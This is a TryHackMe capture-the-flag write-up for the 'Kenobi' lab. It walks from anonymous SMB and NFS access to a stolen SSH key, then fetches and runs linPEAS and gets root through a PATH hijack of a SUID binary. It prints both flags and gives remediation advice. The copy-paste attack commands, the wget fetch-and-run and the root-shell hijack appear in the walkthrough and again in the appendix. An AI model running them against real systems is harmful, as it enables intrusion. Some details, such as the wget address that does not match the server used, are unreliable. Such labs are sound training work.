# Kenobi - TryHackMe Write-up  
**Author:** Muhammad Meraj  
**Date:** 27 November 2025  
*(write-up based on my notes and screenshots) :contentReference[oaicite:0]{index=0}*

---

## Target
**10.64.131.184**

---

## Summary
A machine where *anonymous SMB* access and an NFS export of `/var` provide a leaked private SSH key for user `kenobi`. After obtaining a user shell, privilege escalation is achieved by abusing a SUID helper binary `/usr/bin/menu` that executes programs without absolute paths — allowing a *PATH hijack* to spawn a root shell.

---

## Tools used
- `nmap`  
- `smbclient`  
- `mount` / NFS client  
- `ssh`  
- `wget` / `python3 -m http.server` (to transfer linPEAS)  
- `linpeas.sh` (local enumeration)  

---

## 1) Port scan / service discovery
**Command(s):**

<mark>nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.64.131.184</mark>  
<mark>nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.64.131.184</mark>

*Result:* SMB (445) and RPC/NFS (111) exposed. The NFS export identified `/var`.

![alt text](<Images/Screenshot 2025-11-26 163702.png>)

---

## 2) SMB enumeration & anonymous access
**Commands:**

<mark>smbclient -L //10.64.131.184 -N</mark> 

![alt text](<Images/Screenshot 2025-11-27 000443.png>)

<mark>smbclient //10.64.131.184/anonymous</mark>  
Inside the `smbclient` session:  
<mark>ls</mark>  
<mark>get log.txt</mark>

![alt text](<Images/Screenshot 2025-11-27 000906.png>)


*Notes:* Anonymous login to the `anonymous` share succeeded. `log.txt` was retrieved and inspected for clues.

![alt text](<Images/Screenshot 2025-11-27 001021.png>)

---

## 3) NFS mount of `/var`
**Commands (on attacker machine):**

<mark>mkdir -p /mnt/Kenobi</mark>  
<mark>mount 10.64.131.184:/var /mnt/Kenobi</mark>  
<mark>ls -la /mnt/Kenobi</mark>

![alt text](<Images/Screenshot 2025-11-27 001212.png>)

*Result:* The remote `/var` was mountable and contained files of interest, including a private key for `kenobi` (example path: `/mnt/Kenobi/tmp/id_rsa`).

![alt text](<Images/Screenshot 2025-11-27 003101.png>)

---

## 4) Obtain user shell using leaked private key
**Commands:**

<mark>cp /mnt/Kenobi/tmp/id_rsa .</mark>  
*If permissions are too open SSH will refuse the key.*  
**Correct the permissions:**

![alt text](<Images/Screenshot 2025-11-27 004647.png>)

<mark>chmod 600 id_rsa</mark>

**SSH in as kenobi:**

<mark>ssh -i id_rsa kenobi@10.64.131.184</mark>

![alt text](<Images/Screenshot 2025-11-27 004821.png>)

**Verify and capture user flag:**

<mark>id</mark>  

![alt text](<Images/Screenshot 2025-11-27 005305.png>)

<mark>ls -la</mark>  
<mark>cat user.txt</mark>

![alt text](<Images/Screenshot 2025-11-27 005449.png>)

*Note:* Using overly-permissive permissions (e.g., `chmod 777`) will prevent the key from being accepted; `chmod 600` is required.

---

## 5) Local enumeration (quick wins)
**Commands to transfer and run linPEAS:**

On attacker machine (serving linPEAS):

<mark>cd /opt/PEAS</mark>  
<mark>python3 -m http.server 8000</mark>

![alt text](<Images/Screenshot 2025-11-27 011059.png>)

On the target (kenobi shell):

<mark>wget http://10.64.131.184/linpeas.sh</mark>  
<mark>chmod +x ./linpeas.sh</mark>  
<mark>./linpeas.sh</mark>

![alt text](<Images/Screenshot 2025-11-27 010849.png>)

*Result:* linPEAS output revealed a suspicious SUID binary: **/usr/bin/menu**.

![alt text](<Images/Screenshot 2025-11-27 011715.png>)

---

## 6) Privilege escalation — PATH hijack of SUID helper
**Reasoning:** `/usr/bin/menu` runs helper programs using relative names (for example `curl` or `uname`) without absolute paths. Because the binary is SUID-root and calls external programs without sanitizing `PATH`, placing a malicious executable earlier on `PATH` leads to execution as root.

![alt text](<Images/Screenshot 2025-11-27 012250.png>)

**Exploit steps (as kenobi):**

<mark>cd /tmp</mark>  
<mark>echo "/bin/sh" > curl</mark>  
<mark>chmod 777 curl</mark>  
<mark>export PATH=/tmp:$PATH</mark>  
<mark>/usr/bin/menu</mark>

When the menu option that triggers the (supposed) `curl` call is chosen (e.g., *Status check*), the fake `curl` (`/tmp/curl`) is executed as root and spawns a root shell.

![alt text](<Images/Screenshot 2025-11-27 013627.png>)

**Verify root and capture root flag:**

<mark>id</mark>  
<mark>ls -la /root</mark>  
<mark>cat /root/root.txt</mark>

*Result:* Root shell obtained and `root.txt` captured.

![alt text](<Images/Screenshot 2025-11-27 013943.png>)

---

## 7) Flags
- **User flag:** captured from `user.txt`.

<mark>d0b0f3f53b6caa532a83915e19224899</mark>

- **Root flag:** captured from `/root/root.txt` after PATH hijack.

<mark>177b3cd8562289f37382721c28381f02</mark>

---

## 8) Remediation & notes
- **Do not export sensitive directories via NFS** unless absolutely necessary. If required, restrict mounts by host and avoid exporting directories that contain private keys (e.g., `/var`, `/home`, `/root`).
- **Avoid storing private keys on exported file systems** and ensure proper permissions are enforced. Private keys should never be world-readable or placed in `/tmp` or other shared locations.
- **SUID binaries must be audited.** Programs running as root must call helpers using absolute paths and should sanitize the environment (including `PATH`) before executing external programs.
- **Harden services**: disable anonymous SMB or restrict shares and properly configure ProFTPD / other services to not allow module-based abuse (if applicable).

---

## Appendix — Useful commands (copy-paste)
**Discovery & enumeration**
<mark>nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.64.131.184</mark>  
<mark>nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.64.131.184</mark>

**SMB**
<mark>smbclient -L //10.64.131.184 -N</mark>  
<mark>smbclient //10.64.131.184/anonymous</mark>  
(inside) <mark>get log.txt</mark>

**NFS mount**
<mark>mkdir -p /mnt/Kenobi</mark>  
<mark>mount 10.64.131.184:/var /mnt/Kenobi</mark>  
<mark>ls -la /mnt/Kenobi</mark>

**SSH via leaked key**
<mark>cp /mnt/Kenobi/tmp/id_rsa .</mark>  
<mark>chmod 600 id_rsa</mark>  
<mark>ssh -i id_rsa kenobi@10.64.131.184</mark>

**Transfer linPEAS**
(attack box) <mark>python3 -m http.server 8000</mark>  
(target) <mark>wget http://10.64.131.184/linpeas.sh</mark>  
<mark>chmod +x ./linpeas.sh</mark>  
<mark>./linpeas.sh</mark>

**PATH hijack exploit**
<mark>cd /tmp</mark>  
<mark>echo "/bin/sh" > curl</mark>  
<mark>chmod 777 curl</mark>  
<mark>export PATH=/tmp:$PATH</mark>  
<mark>/usr/bin/menu</mark>